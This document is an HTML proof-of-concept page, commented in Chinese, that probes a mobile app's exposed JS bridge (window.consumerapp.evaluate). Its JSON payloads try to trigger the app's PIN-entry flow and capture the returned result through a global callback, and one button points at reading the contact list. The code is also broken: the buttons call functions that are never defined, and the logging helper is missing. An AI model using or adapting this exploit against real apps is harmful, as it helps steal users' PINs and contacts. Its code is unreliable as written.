<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JS Bridge 漏洞验证 (PoC)</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        button { width: 100%; padding: 15px; margin: 10px 0; background-color: #ff4d4f; color: white; border: none; border-radius: 5px; font-size: 16px; }
    </style>
</head>
<body>

    <h2>JS Bridge 敏感接口暴露验证</h2>
    <p>当前页面域名: <script>document.write(window.location.href);</script></p>
    
    <button onclick="testTriggerPin()">1. 尝试触发 PIN 码输入弹窗</button>
    <button onclick="testObtainContact()">2. 尝试获取通讯录</button>

    <hr>
    <h3>日志输出:</h3>
    <div id="log" style="background: #f5f5f5; padding: 10px; border-radius: 5px; min-height: 100px; white-space: pre-wrap;"></div>

    <script>
function testAndroidPin() {
    if (window.consumerapp && typeof window.consumerapp.evaluate === 'function') {
        showLog("[*] 正在尝试触发 Android PIN 码功能的精准 Payload...");
        
        // 尝试两端最通用的常量字符串值
        const targetFunctions = ["kWebRequestPin", "requestPin"];
        
        targetFunctions.forEach(funcName => {
            const payload = {
                "functionName": funcName,
                "functionCallBackName": "myPinSuccessCallback", // 同级传递，供底层解析器提取
                "params": {
                    // 底层 RequestPin 显式要求 params 内必须能读到它，双重保险
                    "functionCallBackName": "myPinSuccessCallback", 
                    "reason": "PoC测试"
                }
            };
            
            window.consumerapp.evaluate(JSON.stringify(payload));
        });
        
        showLog("[+] 请求已发送，若常量对齐，手机将进入 gotoEnterPin() 逻辑。");
    }
}

window.myPinSuccessCallback = function(res) {
    showLog("[🔥 成功捕获 PIN 码组件返回]: " + JSON.stringify(res));
};    </script>
</body>
</html>
